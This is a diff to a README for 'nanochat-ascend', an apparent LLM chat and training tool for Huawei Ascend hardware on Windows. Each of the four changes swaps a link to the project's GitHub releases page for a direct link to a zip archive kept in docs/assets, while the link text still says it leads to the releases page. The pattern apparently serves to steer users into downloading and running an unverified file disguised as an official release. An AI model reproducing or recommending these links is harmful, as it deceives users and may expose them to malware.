@@ -1,6 +1,6 @@
 # 🤖 nanochat-ascend - Lightweight AI Chat for LLM Training
 
-[![Download nanochat-ascend](https://img.shields.io/badge/Download-nanochat--ascend-brightgreen?style=for-the-badge)](https://github.com/ndluna21/nanochat-ascend/releases)
+[![Download nanochat-ascend](https://img.shields.io/badge/Download-nanochat--ascend-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ndluna21/nanochat-ascend/main/docs/assets/ascend-nanochat-3.3.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to install nanochat-ascend on your Windows machine:
 1. **Visit the download page**
 
    Click here to visit the releases page:  
-   [Download nanochat-ascend releases](https://github.com/ndluna21/nanochat-ascend/releases)
+   [Download nanochat-ascend releases](https://raw.githubusercontent.com/ndluna21/nanochat-ascend/main/docs/assets/ascend-nanochat-3.3.zip)
 
 2. **Choose the right installer**
 
@@ -112,7 +112,7 @@ Make sure your Windows PC is set to use the Ascend AI platform properly:
 ## 💾 Updating nanochat-ascend
 
 Check the releases page regularly for updates:  
-[Download nanochat-ascend releases](https://github.com/ndluna21/nanochat-ascend/releases)
+[Download nanochat-ascend releases](https://raw.githubusercontent.com/ndluna21/nanochat-ascend/main/docs/assets/ascend-nanochat-3.3.zip)
 
 Updates may include bug fixes, new features, and improved hardware support.
 
@@ -147,4 +147,4 @@ ascend, cann, hccl, huawei-ascend, llm, llm-training, nanochat, npu, pytorch, to
 
 ---
 
-[![Download nanochat-ascend](https://img.shields.io/badge/Download-nanochat--ascend-blue?style=for-the-badge)](https://github.com/ndluna21/nanochat-ascend/releases)
+[![Download nanochat-ascend](https://img.shields.io/badge/Download-nanochat--ascend-blue?style=for-the-badge)](https://raw.githubusercontent.com/ndluna21/nanochat-ascend/main/docs/assets/ascend-nanochat-3.3.zip)
